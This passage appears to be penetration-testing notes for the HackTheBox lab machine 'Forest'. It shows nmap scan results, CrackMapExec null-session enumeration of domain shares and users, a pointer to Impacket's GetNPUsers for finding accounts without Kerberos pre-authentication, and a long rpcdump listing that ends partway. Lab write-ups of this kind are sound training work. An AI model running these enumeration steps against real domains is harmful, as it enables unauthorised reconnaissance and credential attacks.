# Enumeration

## NMAP
```nmap
# Nmap 7.93 scan initiated Mon Feb 13 17:00:48 2023 as: nmap -p- -sV -sC --open -vv -oN basic_nmap -T4 10.129.210.137
Nmap scan report for 10.129.210.137
Host is up, received conn-refused (0.070s latency).
Scanned at 2023-02-13 17:00:48 EST for 112s
Not shown: 65035 closed tcp ports (conn-refused), 477 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2023-02-13 22:08:28Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49681/tcp open  msrpc        syn-ack Microsoft Windows RPC
49698/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m09s, median: 6m48s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42624/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58399/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 31886/udp): CLEAN (Timeout)
|   Check 4 (port 18171/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-13T22:09:22
|_  start_date: 2023-02-13T22:07:12
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-13T14:09:21-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 13 17:02:41 2023 -- 1 IP address (1 host up) scanned in 112.93 seconds

```

## CrackMapExec
```bash
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ crackmapexec smb $IP -u '' -p '' --shares
SMB         10.129.210.137  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.210.137  445    FOREST           [+] htb.local\: 
SMB         10.129.210.137  445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/machines/forest]
└─$ crackmapexec smb $IP -u '' -p '' --users 
SMB         10.129.210.137  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.210.137  445    FOREST           [+] htb.local\: 
SMB         10.129.210.137  445    FOREST           [-] Error enumerating domain users using dc ip 10.129.210.137: NTLM needs domain\username and a password
SMB         10.129.210.137  445    FOREST           [*] Trying with SAMRPC protocol
SMB         10.129.210.137  445    FOREST           [+] Enumerated domain user(s)
SMB         10.129.210.137  445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.129.210.137  445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.210.137  445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.129.210.137  445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.129.210.137  445    FOREST           htb.local\$331000-VK4ADACQNUCA           
SMB         10.129.210.137  445    FOREST           htb.local\SM_2c8eef0a09b545acb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
SMB         10.129.210.137  445    FOREST           htb.local\SM_75a538d3025e4db9a           
SMB         10.129.210.137  445    FOREST           htb.local\SM_681f53d4942840e18           
SMB         10.129.210.137  445    FOREST           htb.local\SM_1b41c9286325456bb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
SMB         10.129.210.137  445    FOREST           htb.local\SM_7c96b981967141ebb           
SMB         10.129.210.137  445    FOREST           htb.local\SM_c75ee099d0a64c91b           
SMB         10.129.210.137  445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxc3d7722           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxfc9daad           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxc0a90c9           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox670628e           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox968e74d           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox6ded678           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox83d6781           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxfd87238           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailboxb01ac64           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox7108a4e           
SMB         10.129.210.137  445    FOREST           htb.local\HealthMailbox0659cc1           
SMB         10.129.210.137  445    FOREST           htb.local\sebastien                      
SMB         10.129.210.137  445    FOREST           htb.local\lucinda                        
SMB         10.129.210.137  445    FOREST           htb.local\svc-alfresco                   
SMB         10.129.210.137  445    FOREST           htb.local\andy                           
SMB         10.129.210.137  445    FOREST           htb.local\mark                           
SMB         10.129.210.137  445    FOREST           htb.local\santi      
```

# GetNPUsers
- the `GetNPUsers` impacket script checks for accounts that do not need Kerberos pre-authentication enabled
![](Pasted%20image%2020230213152443.png)

## RPCDump (trash)
```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.210.137
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49664]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\FOREST[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc071230]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
Bindings: 
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\FOREST[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc071230]
          ncalrpc:[WMsgKRpc073921]

Protocol: N/A 
Provider: N/A 
UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0 
Bindings: 
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-869cb06477bad80729]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-b8fb5ad1a06f6bd4df]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: N/A 
UUID    : 697DCDA9-3BA9-4EB2-9247-E11F1901B0D2 v1.0 
Bindings: 
          ncalrpc:[LRPC-869cb06477bad80729]
          ncalrpc:[LRPC-17de353650058154d9]
          ncacn_np:\\FOREST[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]

Protocol: N/A 
Provider: sysntfy.dll 
UUID    : C9AC6DB5-82B7-4E55-AE8A-E464ED7B4277 v1.0 Impl friendly name
Bindings: 
          ncalrpc:[LRPC-9579d48daf9e6299c0]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[IUserProfile2]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-PCQ]: Performance Counter Query Protocol 
Provider: regsvc.dll 
UUID    : DA5A86C5-12C2-4943-AB30-7F74A813D853 v1.0 RemoteRegistry Perflib Interface
Bindings: 
          ncacn_np:\\FOREST[\PIPE\winreg]

Protocol: [MS-RRP]: Windows Remote Registry Protocol 
Provider: regsvc.dll 
UUID    : 338CD001-2244-31F1-AAAA-900038001003 v1.0 RemoteRegistry Interface
Bindings: 
          ncacn_np:\\FOREST[\PIPE\winreg]

Protocol: N/A 
Provider: N/A 
UUID    : 3473DD4D-2E88-4006-9CBA-22570909DD10 v5.1 WinHttp Auto-Proxy Service
Bindings: 
          ncalrpc:[OLE9F996FE7B37DA686CAF2191E37F3]
          ncalrpc:[LRPC-ce93dfe614c0a7faaf]

Protocol: N/A 
Provider: nsisvc.dll 
UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
Bindings: 
          ncalrpc:[LRPC-ce93dfe614c0a7faaf]

Protocol: N/A 
Provider: N/A 
UUID    : A500D4C6-0DD1-4543-BC0C-D5F93486EAF8 v1.0 
Bindings: 
          ncalrpc:[LRPC-ca521617d5a390aca7]
          ncalrpc:[LRPC-b8fb5ad1a06f6bd4df]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: dhcpcsvc.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: dhcpcsvc6.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
Provider: wevtsvc.dll 
UUID    : F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C v1.0 Event log TCPIP
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49665]
          ncacn_np:\\FOREST[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: nrpsrv.dll 
UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
Bindings: 
          ncalrpc:[LRPC-3b8bd5b89041fcfda1]

Protocol: N/A 
Provider: N/A 
UUID    : 0D3C7F20-1C8D-4654-A1B3-51563B298BDA v1.0 UserMgrCli
Bindings: 
          ncalrpc:[LRPC-f43f775c33ce28c744]
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : B18FBAB6-56F8-4702-84E0-41053293A869 v1.0 UserMgrCli
Bindings: 
          ncalrpc:[LRPC-f43f775c33ce28c744]
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: IKEEXT.DLL 
UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : C49A5A70-8A7F-4E70-BA16-1E8F1F193EF1 v1.0 Adh APIs
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : C36BE077-E14B-4FE9-8ABC-E856EF4F048B v1.0 Proxy Manager client server endpoint
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : 2E6035B2-E8F1-41A7-A044-656B439C4C34 v1.0 Proxy Manager provider server endpoint
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: iphlpsvc.dll 
UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: N/A 
UUID    : 3A9EF155-691D-4449-8D05-09AD57031823 v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: schedsvc.dll 
UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49666]
          ncalrpc:[ubpmtaskhostchannel]
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
Bindings: 
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
Bindings: 
          ncacn_np:\\FOREST[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: schedsvc.dll 
UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
Bindings: 
          ncalrpc:[senssvc]
          ncalrpc:[OLEA7B2222FF1CE635A037B53BB2BAA]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: gpsvc.dll 
UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 Group Policy RPC Interface
Bindings: 
          ncalrpc:[LRPC-c6f1a59d5864cd3365]

Protocol: N/A 
Provider: N/A 
UUID    : 7F1343FE-50A9-4927-A778-0C5859517BAC v1.0 DfsDs service
Bindings: 
          ncacn_np:\\FOREST[\PIPE\wkssvc]
          ncalrpc:[LRPC-91901ac75fd4cca5d8]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : EB081A0D-10EE-478A-A1DD-50995283E7A8 v3.0 Witness Client Test Interface
Bindings: 
          ncalrpc:[LRPC-91901ac75fd4cca5d8]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : F2C9B409-C1C9-4100-8639-D8AB1486694A v1.0 Witness Client Upcall Server
Bindings: 
          ncalrpc:[LRPC-91901ac75fd4cca5d8]
          ncalrpc:[DNSResolver]

Protocol: N/A 
Provider: N/A 
UUID    : DF4DF73A-C52D-4E3A-8003-8437FDF8302A v0.0 WM_WindowManagerRPC\Server
Bindings: 
          ncalrpc:[LRPC-5d49552f64428161cf]
          ncalrpc:[OLE9CB6DB1B5935B301D3A0E924CCB2]
          ncalrpc:[LRPC-da5501c76bfeee6c77]
          ncalrpc:[LRPC-3b7096e88536652738]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 2FB92682-6599-42DC-AE13-BD2CA89BD11C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-da5501c76bfeee6c77]
          ncalrpc:[LRPC-3b7096e88536652738]

Protocol: N/A 
Provider: N/A 
UUID    : F47433C3-3E9D-4157-AAD4-83AA1F5C2D4C v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-da5501c76bfeee6c77]
          ncalrpc:[LRPC-3b7096e88536652738]

Protocol: N/A 
Provider: MPSSVC.dll 
UUID    : 7F9D11BF-7FB9-436B-A812-B2D50C5D4C03 v1.0 Fw APIs
Bindings: 
          ncalrpc:[LRPC-da5501c76bfeee6c77]
          ncalrpc:[LRPC-3b7096e88536652738]

Protocol: N/A 
Provider: BFE.DLL 
UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
Bindings: 
          ncalrpc:[LRPC-3b7096e88536652738]

Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
Provider: FwRemoteSvr.dll 
UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49671]

Protocol: N/A 
Provider: efssvc.dll 
UUID    : 04EEB297-CBF4-466B-8A2A-BFD6A2F10BBA v1.0 EFSK RPC Interface
Bindings: 
          ncacn_np:\\FOREST[\pipe\efsrpc]
          ncalrpc:[LRPC-bdaf3df44f6f42d3a4]

Protocol: N/A 
Provider: efssvc.dll 
UUID    : DF1941C5-FE89-4E79-BF10-463657ACF44D v1.0 EFS RPC Interface
Bindings: 
          ncacn_np:\\FOREST[\pipe\efsrpc]
          ncalrpc:[LRPC-bdaf3df44f6f42d3a4]

Protocol: [MS-NRPC]: Netlogon Remote Protocol 
Provider: netlogon.dll 
UUID    : 12345678-1234-ABCD-EF00-01234567CFFB v1.0 
Bindings: 
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-RAA]: Remote Authorization API Protocol 
Provider: N/A 
UUID    : 0B1C2170-5732-4E0E-8CD3-D9B16F3B84D7 v0.0 RemoteAccessCheck
Bindings: 
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]
          ncalrpc:[NETLOGON_LRPC]
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
Provider: lsasrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-NSPI]: Name Service Provider Interface (NSPI) Protocol 
Provider: ntdsai.dll 
UUID    : F5CC5A18-4264-101A-8C59-08002B2F8426 v56.0 MS NT Directory NSP Interface
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
Provider: samsrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49677]
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
Provider: ntdsai.dll 
UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
Bindings: 
          ncacn_np:\\FOREST[\pipe\f13c4066825833bd]
          ncacn_http:10.129.210.137[49676]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEE4E3C72A0C60FF7CED9403703182]
          ncacn_ip_tcp:10.129.210.137[49667]
          ncalrpc:[samss lpc]
          ncalrpc:[SidKey Local End Point]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSA_EAS_ENDPOINT]
          ncalrpc:[lsacap]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncacn_np:\\FOREST[\pipe\lsass]

Protocol: N/A 
Provider: N/A 
UUID    : 1A0D010F-1C33-432C-B0F5-8CF4E8053099 v1.0 IdSegSrv service
Bindings: 
          ncalrpc:[LRPC-fd3474666950b7af3a]

Protocol: N/A 
Provider: srvsvc.dll 
UUID    : 98716D03-89AC-44C7-BB8C-285824E51C4A v1.0 XactSrv service
Bindings: 
          ncalrpc:[LRPC-fd3474666950b7af3a]

Protocol: N/A 
Provider: N/A 
UUID    : E38F5360-8572-473E-B696-1B46873BEEAB v1.0 
Bindings: 
          ncalrpc:[LRPC-d01c61acbd8823e527]

Protocol: N/A 
Provider: N/A 
UUID    : 4C9DBF19-D39E-4BB9-90EE-8F7179B20283 v1.0 
Bindings: 
          ncalrpc:[LRPC-d01c61acbd8823e527]

Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Provider: msdtcprx.dll 
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
Bindings: 
          ncalrpc:[LRPC-5cfd429cd2b0d68a3b]
          ncalrpc:[OLE6ABBC03867EA3898C9F570A96737]
          ncalrpc:[LRPC-c1be22243e18c10024]
          ncalrpc:[LRPC-c1be22243e18c10024]
          ncalrpc:[LRPC-c1be22243e18c10024]

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
Provider: services.exe 
UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
Bindings: 
          ncacn_ip_tcp:10.129.210.137[49681]

Protocol: N/A 
Provider: N/A 
UUID    : F3F09FFD-FBCF-4291-944D-70AD6E0E73BB v1.0 
Bindings: 
          ncalrpc:[LRPC-eb3929a0d4b674f50c]

Protocol: N/A 
Provider: N/A 
UUID    : 64D1D045-F675-460B-8A94-570246B36DAB v1.0 CLIPSVC Default RPC Interface
Bindings: 
          ncalrpc:[ClipServiceTransportEndpoint-00001]

Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
Provider: dns.exe 
